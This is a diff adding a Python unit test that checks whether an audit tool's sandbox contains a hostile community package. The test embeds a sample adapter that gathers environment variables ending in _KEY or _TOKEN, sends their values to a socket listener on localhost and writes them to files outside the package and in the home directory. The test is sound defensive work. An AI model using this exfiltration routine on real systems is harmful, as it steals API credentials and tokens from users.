@@ -2,11 +2,14 @@
    python -m unittest discover -s pack/runtime/tests"""
 import json
 import re
+import os
 import shutil
+import socket
 import subprocess
 import sys
 import tempfile
 import unittest
+import uuid
 from pathlib import Path
 
 REPO = Path(__file__).resolve().parents[3]
@@ -106,10 +109,10 @@ def make_study(adapter=INDEPENDENT, verbatim_value=MATERIAL, extra=None):
     return root
 
 
-def run_audit(root, *args):
+def run_audit(root, *args, env=None):
     out = root.parent / "out"
     run = subprocess.run([sys.executable, str(AUDIT), str(root), "--out", str(out), "--workdir", str(root.parent / "work"),
-                          "--no-export", *args], capture_output=True, text=True, timeout=300)
+                          "--no-export", *args], capture_output=True, text=True, timeout=300, env=env)
     report = json.loads((out / root.name / "audit.json").read_text(encoding="utf-8"))
     return run, {i["id"]: i for i in report["items"]}, report
 
@@ -187,6 +190,77 @@ class AuditTest(unittest.TestCase):
         self.assertEqual(items["T2"]["result"], "fail")
         self.assertIn("package/test/notes.md:1", items["T2"]["evidence"])
         self.assertEqual(items["A6"]["result"], "fail")
+
+    def test_hostile_package_is_confined_and_still_reported(self):
+        """A community package's adapter tries to take keys, reach the network and write outside its copy."""
+        sys.path.insert(0, str(BUILD))
+        import sandbox_run
+        secrets = {"OPENROUTER_API_KEY": "sk-or-v1-" + "7" * 40, "ANTHROPIC_API_KEY": "sk-ant-" + "8" * 24,
+                   "GITHUB_TOKEN": "ghp_" + "9" * 36}
+        listener = socket.socket()
+        listener.bind(("127.0.0.1", 0))
+        listener.listen(5)
+        listener.settimeout(0.5)
+        tag = uuid.uuid4().hex[:10]
+        home_file = Path.home() / (".hs-audit-escape-%s" % tag)
+        root = self.study()
+        outside = root.parent / "escaped.txt"
+        hostile = INDEPENDENT.replace("def run_sessions(llm, seed, n, arms=None):\n", HOSTILE_RUN % (
+            listener.getsockname()[1], str(outside), str(home_file))).replace('print("ok")', 'run_sessions(lambda p: "1", 0, 1)')
+        (root / "package/test/task/adapter.py").write_text(hostile, encoding="utf-8")
+        subprocess.run([sys.executable, str(BUILD / "capabilities.py"), str(root)], capture_output=True, timeout=60)
+        self.assertIn(json.loads((root / "capabilities.json").read_text(encoding="utf-8"))["run"]["status"], ("yes", "partial"))
+        try:
+            run, items, report = run_audit(root, "--only", "P1,C4", env=dict(os.environ, **secrets))
+            try:
+                conn, _ = listener.accept()
+                got = conn.recv(100)
+                conn.close()
+            except OSError:
+                got = None
+        finally:
+            listener.close()
+            escaped_home = home_file.exists()
+            if escaped_home:
+                home_file.unlink()
+        text = json.dumps(report)
+        for value in secrets.values():
+            self.assertNotIn(value, text)
+        self.assertEqual(sorted(items), ["C4", "P1"])
+        self.assertEqual(items["P1"]["result"], "concern", items["P1"])
+        m = re.search(r"HOSTILE env=(\S+) net=(\S+) outside=(\S+) home=(\S+)", items["P1"]["note"])
+        self.assertTrue(m, items["P1"])
+        self.assertEqual(m.group(1), "none")
+        label = sandbox_run.wrapper(root.parent, [])[1]
+        if label.startswith(("sandbox-exec", "unshare")):
+            self.assertEqual(m.group(2), "blocked")
+            self.assertIsNone(got)
+        if label.startswith("sandbox-exec"):
+            self.assertEqual((m.group(3), m.group(4)), ("blocked", "blocked"))
+            self.assertFalse(outside.exists())
+            self.assertFalse(escaped_home)
+        # C4: check_package.py runs the same adapter's smoke test confined too, and its failure is reported.
+        self.assertEqual(items["C4"]["result"], "fail", items["C4"])
+        self.assertIn("check_package.py fails", items["C4"]["evidence"])
+
+
+HOSTILE_RUN = """def run_sessions(llm, seed, n, arms=None):
+    import os, socket
+    keys = [k for k in os.environ if k.endswith(("_KEY", "_TOKEN"))]
+    r = {"env": ",".join(sorted(keys)) or "none"}
+    try:
+        s = socket.create_connection(("127.0.0.1", %d), timeout=3)
+        s.sendall(("|".join(os.environ[k] for k in keys) or "nokeys").encode()); s.close(); r["net"] = "open"
+    except OSError:
+        r["net"] = "blocked"
+    for key, path in (("outside", %r), ("home", %r)):
+        try:
+            open(path, "w").write("|".join(os.environ[k] for k in keys)); r[key] = "wrote"
+        except OSError:
+            r[key] = "blocked"
+    raise RuntimeError("HOSTILE env=%%(env)s net=%%(net)s outside=%%(outside)s home=%%(home)s" %% r)
+def _unused(llm, seed, n, arms=None):
+"""
 
 
 if __name__ == "__main__":
